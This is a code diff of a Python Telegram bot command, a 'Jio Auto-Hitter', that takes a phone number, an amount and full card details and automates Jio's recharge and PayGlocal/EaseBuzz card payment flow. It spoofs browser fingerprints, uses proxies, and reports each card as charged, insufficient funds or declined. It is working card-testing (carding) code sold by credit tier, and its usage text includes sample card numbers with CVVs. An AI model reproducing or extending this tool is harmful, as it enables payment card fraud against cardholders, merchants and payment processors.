+    try:
+        r = jio_sess.get(
+            f"https://www.jio.com/api/jio-recharge-service/recharge/plans/serviceId/{phone}",
+            headers={**bh, "Referer": recharge_ref},
+            timeout=20,
+        )
+        plan_key = _find_plan_key(r.json() if r.text.strip().startswith("{") else {}, amount)
+        print(f"✅ Step 2: Plan key found: {plan_key}")
+    except Exception as e:
+        result["error"] = f"Step 2: {e}"
+        result["status"] = "ERROR"
+        print(f"❌ Step 2 error: {e}")
+        return result
+    if not plan_key:
+        result["error"] = f"Plan ₹{amount} not found"
+        result["status"] = "ERROR"
+        print(f"❌ Step 2: Plan ₹{amount} not found")
+        return result
+
+    # ── Step 3: Buy ──────────────────────────────────────────────────────────
+    print("📡 Step 3: Placing order...")
+    try:
+        jio_sess.post(
+            "https://www.jio.com/api/jio-recharge-service/recharge/buy",
+            headers={**bh, "Content-Type": "application/json",
+                     "Origin": "https://www.jio.com", "Referer": recharge_ref},
+            json={"planKey": plan_key, "selectedService": phone},
+            timeout=15,
+        )
+        print("✅ Step 3: Order placed")
+    except Exception as e:
+        result["error"] = f"Step 3: {e}"
+        result["status"] = "ERROR"
+        print(f"❌ Step 3 error: {e}")
+        return result
+
+    # ── Step 4: Pay → paymentURL ──────────────────────────────────────────────
+    print("📡 Step 4: Getting payment URL...")
+    try:
+        r = jio_sess.post(
+            "https://www.jio.com/api/jio-recharge-service/recharge/pay",
+            headers={**bh, "Content-Type": "application/json",
+                     "Origin": "https://www.jio.com", "Referer": recharge_ref},
+            json={
+                "addonPlanKeys": [],
+                "flexiTopupFlow": False,
+                "servicePlanList": [{"planKey": plan_key, "quantity": 1, "serviceId": phone}],
+            },
+            timeout=15,
+        )
+        payment_url = (r.json().get("paymentURL", "")
+                       if r.text.strip().startswith("{") else "")
+        print(f"✅ Step 4: Payment URL obtained")
+    except Exception as e:
+        result["error"] = f"Step 4: {e}"
+        result["status"] = "ERROR"
+        print(f"❌ Step 4 error: {e}")
+        return result
+    if not payment_url:
+        result["error"] = f"Step 4: no paymentURL"
+        result["status"] = "ERROR"
+        print(f"❌ Step 4: No payment URL")
+        return result
+
+    # ── Step 5: GET redirect page ─────────────────────────────────────────────
+    print("📡 Step 5: Following redirect...")
+    try:
+        r = jio_sess.get(
+            payment_url,
+            headers={**bh,
+                     "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
+                     "Referer": "https://www.jio.com/",
+                     "Sec-Fetch-Dest": "document",
+                     "Sec-Fetch-Mode": "navigate",
+                     "Sec-Fetch-Site": "same-site",
+                     "Upgrade-Insecure-Requests": "1"},
+            timeout=15,
+            allow_redirects=True,
+        )
+        print(f"✅ Step 5: Redirect followed")
+    except Exception as e:
+        result["error"] = f"Step 5: {e}"
+        result["status"] = "ERROR"
+        print(f"❌ Step 5 error: {e}")
+        return result
+
+    fm_action = re.search(r"action='([^']+)'", r.text)
+    if not fm_action:
+        result["error"] = f"Step 5: form action not found"
+        result["status"] = "ERROR"
+        print(f"❌ Step 5: Form action not found")
+        return result
+    form_action = fm_action.group(1)
+    form_fields = dict(re.findall(r"name='([^']+)'\s+value='([^']*)'", r.text))
+
+    # ── Step 6: POST form fields ──────────────────────────────────────────────
+    print("📡 Step 6: Submitting form...")
+    try:
+        r = pay_sess.post(
+            form_action,
+            headers={
+                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Origin": "https://www.jio.com",
+                "Referer": "https://www.jio.com/",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+                "sec-ch-ua-mobile": "?0",
+                "sec-ch-ua-platform": '"Windows"',
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Site": "cross-site",
+                "Upgrade-Insecure-Requests": "1",
+            },
+            data=form_fields,
+            timeout=20,
+            allow_redirects=True,
+        )
+        print(f"✅ Step 6: Form submitted")
+    except Exception as e:
+        result["error"] = f"Step 6: {e}"
+        result["status"] = "ERROR"
+        print(f"❌ Step 6 error: {e}")
+        return result
+
+    m = re.search(r"paramx1=([^&]+)", r.url)
+    paramx1 = m.group(1) if m else ""
+    home_ref = f"https://pay.jio.com/JpgWebApp/home?paramx1={paramx1}&paramx2=dHJ1ZQ=="
+
+    pay_h = {
+        "Accept": "application/json",
+        "Accept-Language": "en-US,en;q=0.9",
+        "content-type": "application/json",
+        "Origin": "https://pay.jio.com",
+        "Referer": home_ref,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+    }
+
+    # ── Step 7: BIN authorize → x-token ──────────────────────────────────────
+    print("📡 Step 7: Authorizing BIN...")
+    try:
+        r = pay_sess.post(
+            "https://pay.jio.com/jiopg/v1/authorize-card-operation",
+            headers=pay_h,
+            json={
+                "paymentMode": "CCDC",
+                "cardPrefix": cc[:6],
+                "isEMISelected": False,
+                "viewOffer": False,
+                "skuCode": None,
+                "copco": None,
+                "isStoreCreditSelected": None,
+            },
+            timeout=15,
+        )
+        bin_data = r.json() if r.text.strip().startswith("{") else {}
+        print(f"✅ Step 7: BIN authorized")
+    except Exception as e:
+        result["error"] = f"Step 7: {e}"
+        result["status"] = "ERROR"
+        print(f"❌ Step 7 error: {e}")
+        return result
+    x_token = bin_data.get("token") or bin_data.get("xToken") or ""
+    invoke_url = bin_data.get("invokeUrl") or "https://pay.jio.com/jpgpciapp/v1/on-ccdc-confirmation"
+    seq_id = bin_data.get("seqId", "")
+    cc_route = bin_data.get("ccRoutePg", "")
+    if not x_token:
+        result["error"] = f"Step 7: no x-token"
+        result["status"] = "ERROR"
+        print(f"❌ Step 7: No x-token")
+        return result
+
+    # ── Step 8: Card submit ──────────────────────────────────────────────────
+    print("📡 Step 8: Submitting card...")
+    ctype, ctype_text, cicon = _detect_card_type(cc)
+    expiry_year = yy if len(yy) == 4 else f"20{yy}"
+    try:
+        r = pay_sess.post(
+            invoke_url,
+            headers={**pay_h, "content-type": "application/json",
+                     "x-token": x_token,
+                     "Referer": "https://pay.jio.com/JpgWebApp/add-new-card/"},
+            json={
+                "cvvNumber": cvv,
+                "cashBackApplied": "N",
+                "isTrxnStatusCheckEnable": "N",
+                "seqId": seq_id,
+                "ccRoutePg": cc_route,
+                "customerCardTypeValue": ctype,
+                "paymentMode": "CCDC",
+                "offerAppliedByCust": False,
+                "viewOffer": False,
+                "cardType": cicon,
+                "cardNumber": cc,
+                "cardTypeText": ctype_text,
+                "expiryMonth": mm.zfill(2),
+                "expiryYear": expiry_year,
+                "cardHolderName": "John Doe",
+                "userCardSaveConsent": False,
+                "browserDetails": {
+                    "browserHeader": "application/json",
+                    "browserJavaEnabled": False,
+                    "browserJavascriptEnabled": True,
+                    "browserLanguage": "en-US",
+                    "browserColorDepth": 24,
+                    "browserScreenHeight": 771,
+                    "browserScreenWidth": 1536,
+                    "browserTz": 330,
+                    "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                },
+            },
+            timeout=30,
+        )
+        ccdc_json = r.json() if r.text.strip().startswith("{") else {}
+        print(f"✅ Step 8: Card submitted")
+    except Exception as e:
+        result["error"] = f"Step 8: {e}"
+        result["status"] = "ERROR"
+        print(f"❌ Step 8 error: {e}")
+        return result
+    result["steps"]["ccdc"] = ccdc_json
+
+    if ccdc_json.get("status") is False:
+        result["error"] = "Jio declined before PayGlocal"
+        result["status"] = "DECLINED"
+        result["message"] = ccdc_json.get("message", "Card declined")
+        result["elapsed"] = round(time.time() - t0, 2)
+        print(f"❌ Card declined at Jio: {result['message']}")
+        return result
+
+    html_form = ccdc_json.get("htmlForm") or ""
+    if not html_form or "easebuzz" not in html_form.lower():
+        result["elapsed"] = round(time.time() - t0, 2)
+        result["status"] = "SUCCESS"
+        result["message"] = "Payment successful (no 3DS)"
+        print("✅ Payment successful (no 3DS required)")
+        return result
+
+    # ── Step 9: EaseBuzz ACS redirect → x-gl-token ───────────────────────────
+    print("📡 Step 9: Processing EaseBuzz 3DS...")
+    encdata_m = (re.search(r'name=["\']encdata["\']\s+value=["\']([^"\']+)["\']', html_form)
+                 or re.search(r'value=["\']([A-Za-z0-9+/=]+)["\'][^>]*name=["\']encdata["\']', html_form))
+    if not encdata_m:
+        result["error"] = "encdata not found in htmlForm"
+        result["status"] = "ERROR"
+        result["elapsed"] = round(time.time() - t0, 2)
+        print("❌ encdata not found")
+        return result
+
+    eb_sess = cf.Session(impersonate="chrome124")
+    r_eb = eb_sess.post(
+        "https://pay.easebuzz.in/acs/v1/redirection",
+        headers={"Content-Type": "application/x-www-form-urlencoded",
+                 "Origin": "https://pay.jio.com", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
+        data={"encdata": encdata_m.group(1)},
+        timeout=20,
+        allow_redirects=True,
+    )
+    m_gl = re.search(
+        r"window\.location\.href\s*=\s*[\"']https://api\.payglocal\.com/gl/payflow-ui/\?x-gl-token=([A-Za-z0-9._\-]+)[\"']",
+        r_eb.text,
+    )
+    if not m_gl:
+        result["steps"]["easebuzz_raw"] = r_eb.text[:500]
+        result["error"] = "x-gl-token not found"
+        result["status"] = "ERROR"
+        result["elapsed"] = round(time.time() - t0, 2)
+        print("❌ x-gl-token not found")
+        return result
+
+    gl_token = m_gl.group(1)
+    gid = _decode_jwt_payload(gl_token).get("x-gl-gid", "")
+    print("✅ Step 9: x-gl-token obtained")
+
+    # ── Step 10a: Load PayGlocal UI ──────────────────────────────────────────
+    print("📡 Step 10: Initializing PayGlocal...")
+    pg_sess = cf.Session(impersonate="chrome124", proxies=proxies)
+    pg_sess.get(
+        "https://api.payglocal.com/gl/payflow-ui/",
+        params={"x-gl-token": gl_token},
+        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "text/html,*/*",
+                 "Referer": "https://pay.easebuzz.in/"},
+        timeout=15,
+        allow_redirects=True,
+    )
+
+    pg_ref = f"https://api.payglocal.com/gl/payflow-ui/?x-gl-token={gl_token}"
+    pg_api_h = {
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "content-type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "Origin": "https://api.payglocal.com",
+        "Referer": pg_ref,
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+        "x-request-time": str(int(time.time() * 1000)),
+    }
+
+    # ── Step 10b: DC session init ────────────────────────────────────────────
+    ipay_path = "/gl/v2/payments/dc/ipay"
+    r_dc = pg_sess.get(
+        "https://api.payglocal.com/gl/v2/payments/redirect/dc",
+        params={"x-gl-token": gl_token},
+        headers={**pg_api_h,
+                 "x-gl-current-host": "api.payglocal.com",
+                 "x-gl-previous-host": "pay.easebuzz.in",
+                 "x-gl-pb-tag-id": "",
+                 "x-gl-gid": gid,
+                 "x-gl-trusted-referrer": "",
+                 "x-gl-referrer-mismatch": "false"},
+        timeout=15,
+    )
+    
+    # ============ SAFELY PARSE DC JSON ============
+    dc_json = {}
+    try:
+        if r_dc.text and r_dc.text.strip().startswith("{"):
+            dc_json = r_dc.json()
+    except json.JSONDecodeError:
+        dc_json = {}
+    
+    action_uri = dc_json.get("data", {})
+    if isinstance(action_uri, dict):
+        action_uri = action_uri.get("payflowTxnResponse", {})
+        if isinstance(action_uri, dict) and action_uri.get("ipayUrlV2"):
+            ipay_path = action_uri["ipayUrlV2"]
+    print("✅ Step 10: PayGlocal initialized")
+
+    # ── Step 10c: risk/fp ────────────────────────────────────────────────────
+    print("📡 Step 11: Getting encryption keys...")
+    visitor_id = _sec.token_hex(8)
+    r_fp = pg_sess.post(
+        "https://api.payglocal.com/gl/v1/payments/risk/fp",
+        params={"x-gl-token": gl_token},
+        headers=pg_api_h,
+        json={"agentData": None, "visitorId": visitor_id},
+        timeout=15,
+    )
+    
+    # ============ SAFELY PARSE FP JSON ============
+    fp_data = {}
+    try:
+        if r_fp.text and r_fp.text.strip().startswith("{"):
+            fp_data = r_fp.json()
+    except json.JSONDecodeError:
+        fp_data = {}
+    
+    data = fp_data.get("data", {})
+    if not isinstance(data, dict):
+        data = {}
+    
+    kid = data.get("kid", "")
+    encrypted_key = data.get("key", "")
+    
+    if not kid or not encrypted_key:
+        result["error"] = f"risk/fp missing kid/key"
+        result["status"] = "ERROR"
+        result["elapsed"] = round(time.time() - t0, 2)
+        print("❌ Failed to get encryption keys")
+        return result
+    print("✅ Step 11: Encryption keys obtained")
+
+    # ── Step 10d: decrypt RSA key + JWE-encrypt card data ────────────────────
+    print("📡 Step 12: Encrypting card data...")
+    pem = _decrypt_payglocal_key(encrypted_key, visitor_id)
+
+    jwe_token = _encrypt_jwe(
+        {
+            "cardNumber": cc,
+            "expiryMonth": mm.zfill(2),
+            "expiryYear": expiry_year,
+            "cvv": cvv,
+            "cardHolderName": "John Doe",
+            "agreedOnTnCs": True,
+            "customerCurrency": "INR",
+            "kountData": {"sessionId": "", "merchantId": ""},
+            "billingData": {
+                "firstName": "John",
+                "lastName": "Doe",
+                "addressLine1": "123 Main St",
+                "city": "Mumbai",
+                "state": "MH",
+                "countryCode": "IND",
+                "postalCode": "400001",
+                "phone": phone,
+                "email": "test@test.com",
+            },
+        },
+        pem, kid,
+    )
+    print("✅ Step 12: Card data encrypted")
+
+    # ── Step 10e: paynow ─────────────────────────────────────────────────────
+    print("📡 Step 13: Processing payment...")
+    r_pay = pg_sess.post(
+        "https://api.payglocal.com/gl/v2/payments/pd/paynow",
+        params={"x-gl-token": gl_token},
+        headers=pg_api_h,
+        json={"isEnc": "true", "kid": kid, "payload": jwe_token},
+        timeout=30,
+    )
+    
+    # ============ SAFELY PARSE PAYNOW JSON ============
+    pay_json = {}
+    try:
+        if r_pay.text and r_pay.text.strip().startswith("{"):
+            pay_json = r_pay.json()
+    except json.JSONDecodeError:
+        pay_json = {}
+    
+    result["steps"]["paynow"] = pay_json
+
+    pay_status = str(pay_json.get("status") or "").upper()
+    print(f"📊 Step 13: PayGlocal status: {pay_status}")
+
+    if pay_status != "INPROGRESS":
+        # ============ SAFELY GET ERRORS ============
+        errors = pay_json.get("errors")
+        if errors is None:
+            errors = {}
+        elif not isinstance(errors, dict):
+            errors = {}
+        
+        detailed_msg = errors.get("detailedMessage", "") if isinstance(errors, dict) else ""
+        if "insufficient" in detailed_msg.lower():
+            result["status"] = "INSUFFICIENT_FUNDS"
+            result["message"] = "Insufficient funds"
+        else:
+            result["status"] = pay_status
+            result["message"] = pay_json.get("message", pay_status)
+        result["elapsed"] = round(time.time() - t0, 2)
+        print(f"✅ Final status: {pay_status}")
+        return result
+
+    # ── Step 10f: Cardinal DataCollection ────────────────────────────────────
+    print("📡 Step 14: Processing Cardinal DDC...")
+    
+    # ============ SAFELY GET CARDINAL FORMS ============
+    data = pay_json.get("data", {})
+    if not isinstance(data, dict):
+        data = {}
+    
+    cardinal_forms = data.get("forms", {})
+    if not isinstance(cardinal_forms, dict):
+        cardinal_forms = {}
+    
+    cdc = cardinal_forms.get("Cardinal_DataCollection", {})
+    if not isinstance(cdc, dict):
+        cdc = {}
+    
+    c_url = cdc.get("formUrl", "")
+    payload = cdc.get("payload", {})
+    if not isinstance(payload, dict):
+        payload = {}
+    c_tok = payload.get("token", "")
+
+    if c_url and c_tok:
+        try:
+            r_c = pg_sess.post(
+                c_url,
+                headers={"Content-Type": "application/x-www-form-urlencoded",
+                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
+                data={"JWT": c_tok},
+                timeout=10,
+                allow_redirects=True,
+            )
+            result["steps"]["cardinal_ddc"] = {"http": r_c.status_code, "body_len": len(r_c.text)}
+            print(f"✅ Step 14: Cardinal DDC processed")
         except Exception as e:
-            elapsed_time = time.time() - start_time
-            print(f"❌ [JIO] Error: {e}")
-            print(traceback.format_exc())
-            
-            result["status"] = "error"
-            result["message"] = str(e)[:100]
-            result["time"] = elapsed_time
-            result["status_display"] = "⚠️ ERROR"
-            result["status_category"] = "error"
-            
-            return result
-            
-        finally:
-            if page:
-                try:
-                    await page.close()
-                except:
-                    pass
+            print(f"⚠️ Cardinal DDC error: {e}")
+            result["steps"]["cardinal_ddc"] = {"error": str(e)}
+    else:
+        print("✅ Step 14: No Cardinal DDC required")
 
-    async def close(self):
-        """Close browser"""
-        await self.browser_manager.close()
+    # ── Step 10g: iPayNow ────────────────────────────────────────────────────
+    print("📡 Step 15: Finalizing payment...")
+    try:
+        r_ipay = pg_sess.post(
+            f"https://api.payglocal.com{ipay_path}",
+            params={"x-gl-token": gl_token},
+            headers=pg_api_h,
+            json={
+                "customerCurrency": "INR",
+                "cardinalRequest": {"messageType": "", "payload": ""},
+                "saveCurrencyPreference": False,
+                "browserDetails": {
+                    "colorDepth": 24,
+                    "javaEnabled": False,
+                    "javaScripEnabled": True,
+                    "language": "en-Us",
+                    "screenHeight": 640,
+                    "screenWidth": 480,
+                    "timeZone": 330,
+                },
+                "reachData": {"fingerprintId": None},
+                "fallbackToInrCurrency": True,
+            },
+            timeout=30,
+        )
+    except Exception as e:
+        print(f"⚠️ iPay request error: {e}")
+        result["error"] = f"iPay request failed: {str(e)[:100]}"
+        result["status"] = "ERROR"
+        result["elapsed"] = round(time.time() - t0, 2)
+        return result
 
-# ============ COMMAND HANDLER ============
+    # ============ SAFELY PARSE IPAY JSON ============
+    ipay_json = {}
+    try:
+        if r_ipay.text and r_ipay.text.strip().startswith("{"):
+            ipay_json = r_ipay.json()
+    except json.JSONDecodeError:
+        ipay_json = {}
 
+    result["steps"]["ipay"] = ipay_json
+
+    # ============ SAFELY EXTRACT STATUS ============
+    ipay_status = str(ipay_json.get("status") or "").upper()
+
+    # ============ SAFELY EXTRACT ERRORS (FIX: handle None) ============
+    errors = ipay_json.get("errors")
+    if errors is None:
+        errors = {}
+    elif not isinstance(errors, dict):
+        errors = {}
+
+    # ============ SAFELY EXTRACT MESSAGES ============
+    detailed_msg = ""
+    display_msg = ""
+
+    if isinstance(errors, dict):
+        detailed_msg = errors.get("detailedMessage", "")
+        display_msg = errors.get("displayMessage", "")
+
+    print(f"📊 Step 15: iPay status: {ipay_status}")
+    print(f"📊 Detailed error: {detailed_msg}")
+    print(f"📊 Display error: {display_msg}")
+
+    # ============ DETECT INSUFFICIENT FUNDS ============
+    if "insufficient" in detailed_msg.lower() or "insufficient" in display_msg.lower():
+        result["status"] = "INSUFFICIENT_FUNDS"
+        result["message"] = "Insufficient funds"
+        print("💰 INSUFFICIENT FUNDS DETECTED!")
+    elif ipay_status == "ISSUER_DECLINE":
+        if "insufficient" in detailed_msg.lower():
+            result["status"] = "INSUFFICIENT_FUNDS"
+            result["message"] = "Insufficient funds"
+        else:
+            result["status"] = "DECLINED"
+            result["message"] = ipay_json.get("message", "Card declined")
+    elif ipay_status in ["SUCCESS", "SUCCEEDED", "COMPLETED", "CAPTURED"]:
+        result["status"] = "CHARGED"
+        result["message"] = "Payment successful"
+        print("✅ PAYMENT SUCCESSFUL!")
+    else:
+        result["status"] = ipay_status
+        result["message"] = ipay_json.get("message", ipay_status)
+
+    result["elapsed"] = round(time.time() - t0, 2)
+
+    print("\n" + "=" * 60)
+    print("🔍 FULL RESPONSE:")
+    print(json.dumps(result, indent=2, ensure_ascii=False))
+    print("=" * 60 + "\n")
+
+    return result
+
+
+# ============ FORMAT JIO RESPONSE ============
+
+def format_jio_response(result: Dict, card: str) -> Tuple[str, str]:
+    """
+    Format Jio response with premium emojis - shows actual detailed error message
+    """
+    
+    status = result.get("status", "UNKNOWN")
+    message = result.get("message", "Unknown")
+    elapsed = result.get("elapsed", 0)
+    amount = result.get("amount", "19")
+    
+    # ============ Get the detailed error message from ipay step ============
+    steps = result.get("steps", {})
+    ipay_data = steps.get("ipay", {})
+    errors = ipay_data.get("errors", {})
+    
+    # Try to get the detailed error message
+    detailed_msg = ""
+    if isinstance(errors, dict):
+        detailed_msg = errors.get("detailedMessage", "")
+        if not detailed_msg:
+            detailed_msg = errors.get("displayMessage", "")
+    
+    # If no detailed message, use the main message
+    if not detailed_msg:
+        detailed_msg = message
+    
+    # Clean up the message
+    if detailed_msg and len(detailed_msg) > 80:
+        detailed_msg = detailed_msg[:77] + "..."
+    
+    card_parts = card.split('|')
+    card_num = card_parts[0] if len(card_parts) > 0 else card[:16]
+    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
+    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
+    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
+    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
+    
+    full_card = f"{card_num}|{exp_month}|{exp_year_short}|{cvv}"
+
+    status_lower = status.upper()
+    
+    # ============ Determine status emoji and text ============
+    if status_lower in ["SUCCESS", "SUCCEEDED", "COMPLETED", "CAPTURED", "CHARGED"]:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        status_text = "Success ✅"
+        status_category = "charged"
+    elif status_lower == "INSUFFICIENT_FUNDS":
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+        status_text = "Insufficient funds"
+        status_category = "approved"
+    elif status_lower in ["DECLINED", "ISSUER_DECLINE", "GENERAL_DECLINE", "FAILED"]:
+        # Check if it's risk decline vs regular decline
+        if "risk" in detailed_msg.lower() or "high risk" in detailed_msg.lower():
+            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["warning"], "⚠️")
+            status_text = detailed_msg[:60] if detailed_msg else "Risk declined"
+            status_category = "declined"
+        elif "insufficient" in detailed_msg.lower():
+            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+            status_text = "Insufficient funds"
+            status_category = "approved"
+        else:
+            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+            status_text = detailed_msg[:60] if detailed_msg else "Declined"
+            status_category = "declined"
+    elif status_lower == "INPROGRESS":
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["processing"], "⏳")
+        status_text = "Processing"
+        status_category = "processing"
+    else:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
+        status_text = status
+        status_category = "error"
+
+    # If status is a generic decline but we have a detailed message, use it
+    if status_lower in ["DECLINED", "GENERAL_DECLINE"] and detailed_msg:
+        status_text = detailed_msg[:60]
+    
+    # Premium emojis for display
+    diamond_emoji = premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")
+    globe_emoji = premium_emoji(PREMIUM_EMOJI_IDS["globe"], "🌐")
+    money_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+    time_emoji = premium_emoji(PREMIUM_EMOJI_IDS["time"], "⏱️")
+    skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
+    
+    # Build the output with proper formatting
+    ui = (
+        f"┏━━━━━━━⍟\n"
+        f"┃ {diamond_emoji} Jio Recharge Result\n"
+        f"┗━━━━━━━━━━━⊛\n\n"
+        f"{globe_emoji}  Site - Jio\n"
+        f"{money_emoji} Amount: ₹{amount}\n\n"
+        f"{full_card}\n"
+        f"  ⤷ {status_emoji} {status_text}\n"
+        f"\n"
+        f"{time_emoji} Time: {elapsed:.2f}s\n"
+        f"{skull_emoji} Bot ➛ @BLADESARKS_V3bot"
+    )
+
+    return ui, status_category
+
+# ============ JIO COMMAND HANDLER ============
+@check_gateway("jhit")
 async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
-    Jio Recharge Hitter - /jhit <phone> <amount> <card>
-    
-    Example:
-    /jhit 6398093450 200 5324880008595624|07|29|471
+    Jio Auto-Hitter command
+    Usage: /jhit <phone> <amount> <cc|mm|yy|cvv>
     """
     if not await verify_group_access(update, context):
         return
 
     user_id = update.effective_user.id
     message = update.effective_message
-    username = update.effective_user.username or update.effective_user.first_name
 
     if not context.args:
         await message.reply_text(
-            "📱 <b>Jio Recharge Hitter</b>\n\n"
-            "Usage: <code>/jhit &lt;phone&gt; &lt;amount&gt; &lt;card&gt;</code>\n"
-            "Example: <code>/jhit 6398093450 200 5324880008595624|07|29|471</code>\n\n"
-            "⚠️ This will attempt to recharge the Jio number\n"
-            "💰 Amount: ₹200 (standard plan)\n"
-            "💳 Card format: NUMBER|MM|YYYY|CVV",
+            "💎 <b>Jio Auto-Hitter</b>\n\n"
+            "Usage:\n"
+            "<code>/jhit &lt;phone&gt; &lt;amount&gt; &lt;cc|mm|yy|cvv&gt;</code>\n\n"
+            "Example:\n"
+            "<code>/jhit 6398093450 19 4232231137515675|09|26|593</code>\n\n"
+            "📱 <b>phone</b> - Jio mobile number\n"
+            "💰 <b>amount</b> - Recharge amount (₹)\n"
+            "💳 <b>card</b> - Card details in cc|mm|yy|cvv format",
             parse_mode=ParseMode.HTML
         )
         return
 
-    # Parse arguments
-    args = list(context.args)
-    
+    args = context.args
     if len(args) < 3:
         await message.reply_text(
-            "❌ <b>Invalid arguments</b>\n\n"
-            "Usage: <code>/jhit &lt;phone&gt; &lt;amount&gt; &lt;card&gt;</code>\n"
-            "Example: <code>/jhit 6398093450 200 5324880008595624|07|29|471</code>",
+            "❌ <b>Invalid format</b>\n\n"
+            "Usage: <code>/jhit &lt;phone&gt; &lt;amount&gt; &lt;cc|mm|yy|cvv&gt;</code>\n"
+            "Example: <code>/jhit 6398093450 19 4232231137515675|09|26|593</code>",
             parse_mode=ParseMode.HTML
         )
         return
-    
-    phone = args[0].strip()
-    amount = args[1].strip()
-    card = " ".join(args[2:]).strip()
-    
-    # Validate phone
-    if not phone.isdigit() or len(phone) != 10:
-        await message.reply_text("❌ Invalid phone number. Must be 10 digits.")
-        return
-    
-    # Validate amount
-    try:
-        amount_int = int(amount)
-        if amount_int <= 0:
-            raise ValueError
-    except:
-        await message.reply_text("❌ Invalid amount. Must be a positive number.")
-        return
-    
-    # Validate card
-    card_parts = card.split('|')
-    if len(card_parts) != 4:
+
+    phone = args[0]
+    amount = args[1]
+    card_raw = args[2]
+
+    parts = re.split(r"[|/]", card_raw)
+    if len(parts) != 4:
         await message.reply_text(
-            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
-            "Example: 5324880008595624|07|29|471"
-        )
-        return
-    
-    # Check credits
-    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
-    if not can_proceed:
-        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
-        return
-
-    # Check gateway access
-    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
-        tier = user_manager.get_tier(user_id)
-        error_message = (
-            f"❌ <b>Jio Hitter not available for {tier.upper()} tier</b>\n\n"
-            f"USE /buy TO UPGRADE YOUR TIER 💎"
-        )
-        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
-        add_user_credits(user_id, 1)
-        return
-
-    jio_hitter_active_tasks[user_id] = True
-    
-    # Get proxy if allowed
-    proxy_str = None
-    if user_manager.can_use_proxy(user_id):
-        if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
-            proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
-            if proxy_list:
-                proxy_str = proxy_list[0]
-                print(f"🔌 Using proxy: {mask_proxy(proxy_str)}")
-
-    status_msg = None
-    
-    try:
-        status_msg = await message.reply_text(
-            f"📱 <b>Jio Recharge in Progress...</b>\n\n"
-            f"📞 Phone: <code>{phone}</code>\n"
-            f"💰 Amount: ₹{amount}\n"
-            f"💳 Card: {card[:6]}******{card[-4:]}\n"
-            f"🔄 Processing...",
+            "❌ <b>Invalid card format</b>\n\n"
+            "Use: <code>cc|mm|yy|cvv</code>\n"
+            "Example: <code>4232231137515675|09|26|593</code>",
             parse_mode=ParseMode.HTML
         )
+        return
 
-        # Create hitter instance
-        hitter = JioRechargeHitter(proxy=proxy_str, headless=True)
-        
-        # Perform recharge
-        result = await hitter.perform_recharge(phone, amount, card)
-        
-        # Close browser
-        await hitter.close()
-        
-        # Get BIN info
-        bin_info = await get_bin_info(card)
-        bin_info_text, bank, country, _, _ = bin_info
-        
-        # Build response
-        status_display = result.get("status_display", "⚠️ UNKNOWN")
-        status_category = result.get("status_category", "unknown")
-        message_text = result.get("message", "Unknown")
-        elapsed = result.get("time", 0)
-        
-        # Parse card for display
-        card_parts = card.split('|')
-        card_num = card_parts[0] if len(card_parts) > 0 else card
-        exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
-        exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
-        cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
-        
-        # Build output
-        output = (
-            f"┏━━━━━━━⍟\n"
-            f"┃ {status_display}\n"
-            f"┗━━━━━━━━━━━⊛\n\n"
-            f"[⌬] 𝐏𝐡𝐨𝐧𝐞 ↣ <code>{phone}</code>\n"
-            f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ ₹{amount}\n"
-            f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year}|{cvv}</code>\n"
